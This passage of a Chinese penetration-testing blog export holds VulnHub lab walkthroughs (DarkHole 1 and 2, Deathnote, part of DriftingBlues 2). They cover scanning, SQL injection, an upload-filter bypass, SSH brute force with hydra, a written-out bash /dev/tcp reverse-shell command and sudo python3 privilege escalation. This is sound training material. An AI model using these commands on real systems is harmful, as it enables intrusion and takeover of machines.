<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x emergency</span><br></pre></td></tr></table></figure>
<p>效果</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062340196.png" /></p>
<p>拿到第二个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062341163.png" /></p>
<p>注，在Linux系统中，/bin/bash是Bash
shell的路径。-p选项告诉Bash启动时要保留当前用户的环境变量，而不是根据登录用户的配置重新初始化环境变量。这意味着在执行命令时，会使用当前环境中的变量，而不是重新加载配置文件——来自
ChatGPT 的解释</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062351179.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DarkHole: 1</title>
    <url>/2024/04/22/DarkHole%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/darkhole-1,724/">DarkHole: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts              </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240      </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.    </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.    </span><br><span class="line">192.168.159.157 00:0c:29:f0:a6:ff      1      60  VMware, Inc.     </span><br><span class="line">192.168.159.254 00:50:56:eb:9c:d3      1      60  VMware, Inc.    </span><br></pre></td></tr></table></figure>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-22 04:54 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.157</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 e4:50:d9:50:5d:91:30:50:e9:b5:7d:ca:b0:51:db:74 (RSA)</span><br><span class="line">|   256 73:0c:76:86:60:63:06:00:21:c2:36:20:3b:99:c1:f7 (ECDSA)</span><br><span class="line">|_  256 54:53:4c:3f:4f:3a:26:f6:02:aa:9a:24:ea:1b:92:8c (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: DarkHole</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:F0:A6:FF (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.86 ms 192.168.159.157</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 29.62 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 主页 <span class="math inline">\(\Rightarrow\)</span> login <span
class="math inline">\(\Rightarrow\)</span> 允许注册</p>
<p>登陆后的地址 <code>http://192.168.159.157/dashboard.php?id=2</code>
参数 <code>id</code> 可能是用户的标识
id，尝试逻辑漏洞，没法直接越权……但可以越权修改密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404221835365.png" /></p>
<p>admin 登录，有文件上传，经测服务端有对文件后缀的检测，不过 phtml
可绕过</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404221901004.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>反弹 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404222021041.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>目录扫描时有扫到 <code>database.php</code> ，读取数据库配置信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404222025836.png" /></p>
<p>登录数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -ujohn -pjohn -Ddarkhole</span><br></pre></td></tr></table></figure>
<p>users 表中查到了admin的信息，没多大意义了……</p>
<p><code>/home/john</code> 下找到个 root 用户的 <code>toto</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404222029026.png" /></p>
<p>猜测 <code>toto</code> 中有调用执行 id 命令，传出来 ida 反汇编</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404222031081.png" /></p>
<p>1001 使用十六进制表示为 <code>0x3E9u</code> 即 john 的 uid</p>
<p>替换 <code>id</code> 命令，提权至 john</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404222034840.png" /></p>
<p>注，提权时用原始反弹的 shell 【先不要执行
<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>】</p>
<p>得 <code>john/root123</code></p>
<p>ssh 登录换个更方便的 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404222039735.png" /></p>
<p>成功拿到 root 权限</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>DarkHole: 2</title>
    <url>/2024/04/23/DarkHole%202/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/darkhole-2,740/">DarkHole: 2 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts        </span><br><span class="line">6 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 360    </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      2     120  VMware, Inc.    </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.    </span><br><span class="line">192.168.159.158 00:0c:29:c5:ad:97      2     120  VMware, Inc.     </span><br><span class="line">192.168.159.254 00:50:56:fe:1c:f1      1      60  VMware, Inc. </span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.158</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-22 21:31 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.158</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)</span><br><span class="line">|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)</span><br><span class="line">|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-git: </span><br><span class="line">|   192.168.159.158:80/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     Repository description: Unnamed repository; edit this file <span class="string">&#x27;description&#x27;</span> to name the...</span><br><span class="line">|_    Last commit message: i changed login.php file <span class="keyword">for</span> more secure </span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: DarkHole V2</span><br><span class="line">MAC Address: 00:0C:29:C5:AD:97 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.61 ms 192.168.159.158</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 31.07 seconds</span><br></pre></td></tr></table></figure>
<p><strong>注</strong>，80 有泄露 git</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 主页 <span class="math inline">\(\Rightarrow\)</span> login <span
class="math inline">\(\Rightarrow\)</span> 无法注册</p>
<p>登录需要 email ，尝试注入未果……</p>
<p>利用 80 泄露的 git 获取源码，工具 git-dumper【<a
href="https://github.com/arthaud/git-dumper">GitHub -
arthaud/git-dumper: A tool to dump a git repository from a
website</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231236721.png" /></p>
<p>登录做了过滤……查日志</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231238075.png" /></p>
<p>得 <code>lush@admin.com/321</code></p>
<p>web 登录，经测 <code>http://192.168.159.158/dashboard.php?id=1</code>
参数 id 存在注入</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231244849.png" /></p>
<p>ssh 表得：<code>jehad/fool</code></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>ssh 登录，在 <code>/home/lama</code> 下找到了第一个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231324436.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v /proc  <span class="comment"># 查找具有写入权限的文件</span></span><br></pre></td></tr></table></figure>
<p>找到个 <code>/opt/web</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231329130.png" /></p>
<p>上传 pspy64 得其运行在 9999</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231329132.png" /></p>
<p>查 <code>/etc/passwd</code> 得 uid=1002 是 losy 用户，反弹 losy 的
shell</p>
<p>因为监听于 localhost ，仅限本地连接，利用 jehad 用户的 shell
来反弹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -G <span class="string">&#x27;http://localhost:9999/&#x27;</span> --data-urlencode <span class="string">&quot;cmd=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.159.152/8080 0&gt;&amp;1&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231339183.png" /></p>
<p><code>.bash_history</code> 中找到了 losy 的密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231345781.png" /></p>
<p>ssh 登录：<code>losy:gang</code></p>
<p><code>sudo -l</code> 知，sudo 可执行 python3，提权至 root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404231341274.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Deathnote: 1</title>
    <url>/2024/03/10/Deathnote/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/deathnote-1,739/">Deathnote: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101046914.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.135 -p1-65535</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101046087.png" /></p>
<p>开了 22,80 端口</p>
<h3 id="web-信息收集">1.3. web 信息收集</h3>
<p>直接访问 <code>192.168.159.135</code> 会被重定向至
<code>http://deathnote.vuln/wordpress/</code> ，修改host文件让该域名指向
<code>192.168.159.135</code> 再访问，是个 <code>wordpress</code>
站点，网站看到个提示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101047658.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101048613.png" /></p>
<p>目录遍历</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://deathnote.vuln/wordpress/&quot;</span> </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101047659.png" /></p>
<p><code>/wordpress/wp-content/uploads/</code> 找到了
notes.txt，像是个密码字典，另外还有个 user.txt，猜测是用户名字典</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101051339.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101051340.png" /></p>
<p>靶机开了 22 端口，爆破测试下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P notes.txt  ssh://192.168.159.135 -e nsr  -t 4 -vV</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101113142.png" /></p>
<p>爆破到个用户及密码：l/death4me</p>
<p>由于是 <code>wordpress</code> 站点，再用 wpscan 扫下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://deathnote.vuln/wordpress/&quot;</span> --ignore-main-redirect --force  -e </span><br></pre></td></tr></table></figure>
<p>扫描结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.38 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://deathnote.vuln/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://deathnote.vuln/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://deathnote.vuln/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://deathnote.vuln/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;</span><br><span class="line"> |  - http://deathnote.vuln/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: twentytwentyone</span><br><span class="line"> | Location: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/</span><br><span class="line"> | Last Updated: 2024-01-16T00:00:00.000Z</span><br><span class="line"> | Readme: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/readme.txt</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 2.1</span><br><span class="line"> | Style URL: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3</span><br><span class="line"> | Style Name: Twenty Twenty-One</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentyone/</span><br><span class="line"> | Description: Twenty Twenty-One is a blank canvas <span class="keyword">for</span> your ideas and it makes the block editor your best brush. Wi...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.3 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: <span class="string">&#x27;Version: 1.3&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:00:00 &lt;===============================================================================================================&gt; (652 / 652) 100.00% Time: 00:00:00</span><br><span class="line">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] No themes Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:00:02 &lt;=============================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:02</span><br><span class="line"></span><br><span class="line">[i] No Timthumbs Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span><br><span class="line"> Checking DB Exports - Time: 00:00:00 &lt;======================================================================================================================&gt; (75 / 75) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No DB Exports Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be <span class="built_in">set</span> to <span class="string">&quot;Plain&quot;</span> <span class="keyword">for</span> those to be detected)</span><br><span class="line"> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;===========================================================================================================&gt; (100 / 100) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Medias Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] kira</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://deathnote.vuln/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat Mar  9 21:33:27 2024</span><br><span class="line">[+] Requests Done: 3594</span><br><span class="line">[+] Cached Requests: 8</span><br><span class="line">[+] Data Sent: 1.04 MB</span><br><span class="line">[+] Data Received: 946.358 KB</span><br><span class="line">[+] Memory used: 266.141 MB</span><br><span class="line">[+] Elapsed time: 00:00:12</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>枚举出个 kira 用户，XML-RPC经测试也可进一步利用【<a
href="https://www.jianshu.com/p/42e3b065ad76">WordPress xmlrpc.php
漏洞利用 - 简书</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101057156.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="ssh-登录">2.1. ssh 登录</h3>
<p>用 l/death4me 登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101121501.png" /></p>
<p>读到个 <code>Brainfuck</code> 编码的 user.txt，解码【<a
href="https://ctf.bugku.com/tool/brainfuck">Brainfuck/OoK加密解密 -
Bugku CTF</a> 或 <a
href="https://www.splitbrain.org/services/ook">Brainfuck/Ook!
Obfuscation/Encoding [splitbrain.org]</a>】后得</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101125174.png" /></p>
<p>得想办法切换到 kira 用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 查suid</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">find / -writable 2&gt;/dev/null  <span class="comment"># 查找具有写入权限的文件</span></span><br></pre></td></tr></table></figure>
<p>无果……继续……但在 /opt/L/kira-case/ 下找到个 case-file.txt 文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101314140.png" /></p>
<p>提示 fake-notebook-rule 文件夹，在 fake-notebook-rule 找到个 hint 和
case.wav</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101318695.png" /></p>
<p>提示得用 cyberchef ，尝试 16 进制转字符串</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101320728.png" /></p>
<p>base64 解码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101320729.png" /></p>
<p>得到个密码 kiraisevil，估计是 kira 的密码，切换测试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101327005.png" /></p>
<p>成功得到第一个 flag</p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403101328810.png" /></p>
<p>拿到第二个 flag</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 2</title>
    <url>/2024/03/27/DriftingBlues%202/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/driftingblues-2,634/">DriftingBlues:
2 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271429150.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271430536.png" /></p>
<p>21 允许匿名登录，且有个 secret.jpg</p>
<p>ftp 登录下载，并在 kali 分析，啥也没找的……</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>扫目录</p>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271442559.png"
alt="3.png" />
<figcaption aria-hidden="true">3.png</figcaption>
</figure>
<p>wpscan 扫下 WordPress</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wpscan --url &quot;http://192.168.159.132/blog/&quot; --ignore-main-redirect --force  -eu  --api-token xxx……xxx</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.22</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N]</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.159.132/blog/ [192.168.159.132]</span></span><br><span class="line"><span class="string">[+] Started: Wed Mar 27 02:39:41 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 